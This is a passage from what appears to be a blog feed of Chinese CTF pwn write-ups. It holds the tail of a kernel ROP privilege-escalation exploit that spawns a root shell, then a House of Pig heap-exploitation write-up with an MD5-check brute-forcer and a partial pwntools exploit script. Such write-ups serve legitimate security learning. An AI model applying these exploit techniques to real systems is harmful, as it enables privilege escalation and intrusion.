class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff8106a6d2: mov rdi, rax; jmp rdx; </span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  save_status();</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = prepare_kernel_cred;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff810a0f49</span> + bias; <span class="comment">// pop rdx; ret</span></span><br><span class="line">  rop[i++] = commit_creds;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff8106a6d2</span> + bias;<span class="comment">//mov rdi, rax; jmp rdx; </span></span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/14/kernel-rop/image-20230816174130879.png" alt="image-20230816174130879"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Pig</title>
      <link href="/2023/08/12/house-of-pig/"/>
      <url>/2023/08/12/house-of-pig/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/01dwang/house_of_pig">https://github.com/01dwang/house_of_pig</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/c/p/h/h/pig [2]&gt; checksec ./pig</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/house_of_pig-main/pig/pig&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PIG</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> freed_sign[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ALL_PIGS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *peppa_des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> peppa_des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> peppa_des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> peppa_freed_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> peppa_last_size;</span><br><span class="line">  <span class="type">int</span> align1;</span><br><span class="line">  <span class="type">char</span> *mummy_des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> mummy_des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> mummy_des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> mummy_freed_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> mummy_last_size;</span><br><span class="line">  <span class="type">int</span> align2;</span><br><span class="line">  <span class="type">char</span> *daddy_des_ptr[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> daddy_des_size[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> daddy_des_exist_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">char</span> daddy_freed_sign[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> daddy_last_size;</span><br><span class="line">  <span class="type">int</span> view_times_left;</span><br><span class="line">  <span class="type">int</span> edit_times_left;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最多20个堆块，0x90&lt;&#x3D;大小&lt;&#x3D;0x430+ 2次读，8次改的机会</p><p>Change roles时需要绕过md5校验</p><p><strong>md5特征</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">init_v5</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)a1 = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">2</span>) = <span class="number">0x67452301</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">3</span>) = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">4</span>) = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  *((_DWORD *)a1 + <span class="number">5</span>) = <span class="number">0x10325476</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最会一个md5值strcmp时会被00截断，所以输入数据的md5符合前位符合“&lt;D\x00”即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">head = <span class="string">&quot;3c4400&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    s=<span class="string">b&#x27;A&#x27;</span>+<span class="built_in">str</span>(i).encode()</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(s).hexdigest().startswith(head):</span><br><span class="line">      <span class="built_in">print</span>(s)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">A26535034</span></span><br><span class="line"><span class="string">B3332073</span></span><br><span class="line"><span class="string">C75929410</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>切换时没有保存des_exist_sign</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_3B3E</span><span class="params">(PIG *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(mmap_0, a1, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(mmap_0-&gt;peppa_des_size, a1-&gt;des_size, <span class="keyword">sizeof</span>(mmap_0-&gt;peppa_des_size));</span><br><span class="line">  <span class="built_in">memcpy</span>(mmap_0-&gt;peppa_freed_sign, a1-&gt;freed_sign, <span class="keyword">sizeof</span>(mmap_0-&gt;peppa_freed_sign));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit 和view时又以des_exist_sign为判断标准而且是0时表示使用，每次切换回来都会使des_exist_sign置零，delte时有没有将指针置零，所以配合存在uaf</p><h3 id="高版本下的IO-FILE利用"><a href="#高版本下的IO-FILE利用" class="headerlink" title="高版本下的IO_FILE利用"></a>高版本下的IO_FILE利用</h3><p>在 libc 2.24 之后增加了对 vtable 位置合法性的检查，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性，所以劫持 _IO_jump_t 的方法失效，但是vtable  _IO_str_jumps 是在 check 范围内，这样exit就会调用_exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"> </span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line">new_size=<span class="number">2</span> * ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) + <span class="number">100</span></span><br></pre></td></tr></table></figure><p>满足</p><ul><li>fp-&gt;_flags&#x3D;0 </li><li>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;&#x3D; _IO_buf_end - _IO_buf_base</li></ul><p>_触发malloc (new_size) -&gt; memcpy (new_buf, old_buf, old_blen); -&gt; free (old_buf);控制_IO_buf_end、_IO_buf_base就可以控制malloc大小和要写入的数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pig&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;message: &quot;</span>,(payload+<span class="string">b&#x27;\n&#x27;</span>)*(size//<span class="number">48</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>(<span class="params">idx,payload</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;message: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Del</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Change</span>(<span class="params">role</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (role == <span class="number">1</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;user:\n&quot;</span>,<span class="string">b&quot;A\x01\x95\xc9\x1c&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (role == <span class="number">2</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;user:\n&quot;</span>,<span class="string">b&quot;B\x01\x87\xc3\x19&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (role == <span class="number">3</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;user:\n&quot;</span>,<span class="string">b&quot;C\x01\xf7\x3c\x32&quot;</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    Add(<span class="number">0x90</span>,<span class="string">b&#x27;tcache size&#x27;</span>) <span class="comment"># B0~B4</span></span><br><span class="line">    Del(x)  <span class="comment"># B0~B4</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x150</span>, <span class="string">b&#x27;tcache size\n&#x27;</span>) <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x150</span>, <span class="string">b&#x27;tcache size\n&#x27;</span>) <span class="comment"># A1~A7</span></span><br><span class="line">    Del(<span class="number">1</span>+x)<span class="comment"># A1~A7</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 0x150大小的A0放入unsortedbin</span></span><br><span class="line">Del(<span class="number">0</span>)<span class="comment"># A0</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#切割A0，剩余的0xa0大小放入unsorted</span></span><br><span class="line">Add(<span class="number">0xb0</span>,<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B5</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#0xa0大小进入smallbin</span></span><br><span class="line">Add(<span class="number">0x180</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A8</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x180</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A9~A15</span></span><br><span class="line">    Del(<span class="number">9</span>+x)</span><br><span class="line"><span class="comment">#A8进入unsortedbind</span></span><br><span class="line">Del(<span class="number">8</span>)<span class="comment">#A8</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#切割A8，unsortedbin还剩下0xa0</span></span><br><span class="line">Add(<span class="number">0xe0</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x8</span>)<span class="comment"># B6</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#剩余a0进入smallbin</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>)<span class="comment"># A16</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#防止a16和topchunk合并  </span></span><br><span class="line">Add(<span class="number">0xf0</span>, <span class="string">b&#x27;B\n&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B7</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#A16放入unsortedbin</span></span><br><span class="line">Del(<span class="number">16</span>)</span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#a16进入largebin</span></span><br><span class="line">Add(<span class="number">0x440</span>, <span class="string">b&#x27;B\n&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># B8</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>)</span><br><span class="line">libc_base = uu64(r(<span class="number">6</span>))-<span class="number">0x1ecfe0</span></span><br><span class="line">free_hook = libc_base + libcelf.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libcelf.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">Edit(<span class="number">16</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">b&#x27;message is: &#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x13940</span></span><br><span class="line">p(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- first largebin_attack</span></span><br><span class="line"><span class="comment">#恢复A16的fd和bk</span></span><br><span class="line">Edit(<span class="number">16</span>, <span class="number">2</span>*p64(libc_base+<span class="number">0x1ecfe0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A17</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># A18</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x8</span>) 